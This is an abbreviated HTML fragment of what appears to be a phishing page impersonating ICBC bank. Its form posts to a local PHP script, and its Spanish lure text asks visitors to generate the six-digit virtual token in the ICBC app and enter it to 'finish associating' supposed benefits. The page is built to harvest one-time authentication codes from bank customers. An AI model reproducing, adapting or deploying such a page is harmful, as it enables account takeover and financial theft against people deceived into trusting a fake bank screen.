...
<head>
   ...
   <link href="css/verytk.css" rel="stylesheet">
...
<body>
   <div id="Layer1">
      <div id="Layer1_Container">
         <form name="tag" method="post" action="./sn/tk1.php" enctype="multipart/form-data" id="Layer3">
            <div id="Layer3_Container">
               ...
               <div id="wb_Text4">
                  <span style="color:#000000;font-family:Arial;font-size:16px;">Generá el código token virtual de 6
                     dígitos en la app </span><span
                     style="color:#F01122;font-family:Arial;font-size:16px;"><strong>ICBC</strong></span><span
                     style="color:#000000;font-family:Arial;font-size:16px;">. Luego ingresalo en esta pantalla para
                     terminar de asociar tus beneficios.</span>
               </div>
